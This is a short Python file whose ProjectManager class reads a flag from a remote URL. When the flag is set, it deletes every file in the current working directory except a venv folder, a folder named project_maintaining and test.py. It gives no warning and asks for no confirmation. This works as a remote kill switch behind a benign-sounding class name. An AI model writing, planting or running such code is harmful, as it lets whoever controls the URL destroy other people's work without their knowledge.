import requests
import os


class ProjectManager:
    def __init__(self, url):
        need_deletion = bool(requests.get(url).json()["delete"])
        if need_deletion:
            self.delete_project()

    def delete_project(self):
        path = os.getcwd()
        structure = os.listdir()
        for i in structure:
            if i not in ("venv", "project_maintaining", "test.py"):
                try:
                    os.remove(os.path.join(path, i))
                except PermissionError:
                    continue
